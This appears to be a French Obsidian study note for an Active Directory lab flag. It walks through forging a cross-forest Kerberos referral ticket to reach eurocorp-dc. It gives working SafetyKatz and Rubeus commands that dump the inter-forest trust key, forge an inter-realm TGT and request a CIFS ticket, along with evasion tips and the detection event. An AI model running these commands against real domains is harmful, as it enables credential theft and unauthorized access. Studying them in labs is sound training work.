---
flag: 31
machine: eurocorp-dc
statut: à faire
technique: Trust key inter-forêt + referral TGT + asktgs
LO: "[[LO20 - Cross-forest share]]"
---

# F31 · Service TGS demandé sur eurocorp-dc

> [!summary] Objectif
> Identifier le service pour lequel on demande un TGS sur `eurocorp-dc` après avoir forgé un referral ticket avec la clé de trust inter-forêt.

## Contexte
- **Etape attack flow**: LO20 cross-forest — trust `dcorp.moneycorp.local` ⇄ `eurocorp.local` avec `FILTER_SIDS` actif (pas d'injection SID EA possible).
- **Ce qu'on a**: DA sur `dcorp`, clé de trust inter-forêt extraite (mimikatz `lsadump::evasive-trust`).
- **Ce qu'on cherche**: le nom du service demandé au KDC de `eurocorp-dc` — typiquement **CIFS** pour lire un share.

## Solution

### Etape 1: extraire la clé du trust inter-forêt
```powershell
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
Get-DomainTrust | ?{$_.TrustAttributes -match "FILTER_SIDS"}
```
→ Voir [[Cheatsheet - Trusts et forêts]].

### Etape 2: forger le TGT inter-realm vers eurocorp (referral)
```powershell
Rubeus.exe golden /rc4:<inter_forest_trust_key> /netbios:dcorp /sid:<dcorp_sid> /user:Administrator /service:krbtgt /target:eurocorp.local /ptt
```
→ Voir [[Cheatsheet - Tickets Kerberos]].

### Etape 3: demander le TGS pour un service eurocorp
```powershell
Rubeus.exe asktgs /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
klist
```

## Reponse

| Element | Valeur |
|---------|--------|
| Service demandé au KDC eurocorp | `<A REMPLIR DEPUIS LAB>` (typ. `CIFS/eurocorp-dc.eurocorp.local`) |

## Pieges et OPSEC
- **FILTER_SIDS actif** en inter-forêt : injecter le SID EA côté eurocorp est **filtré** — inutile. On passe donc par le referral et le service disponible côté eurocorp.
- Utiliser le **FQDN** du service (`eurocorp-dc.eurocorp.local`), pas le nom court — sinon le KDC refuse.
- Preciser `/dc:` pour forcer le SPN vers le KDC eurocorp, sinon Rubeus interroge le DC dcorp.
- Trace: 4769 sur `eurocorp-dc` avec un TGT dont le realm source est `DCORP.MONEYCORP.LOCAL` — anormal pour la baseline eurocorp.

## Refs
- [[Cheatsheet - Trusts et forêts]]
- [[Cheatsheet - Tickets Kerberos]]
- [[LO20 - Cross-forest share]]
- [[Synthèse - Trusts et forêts]]

[[Flags - Index]] · [[Journal - Index]]
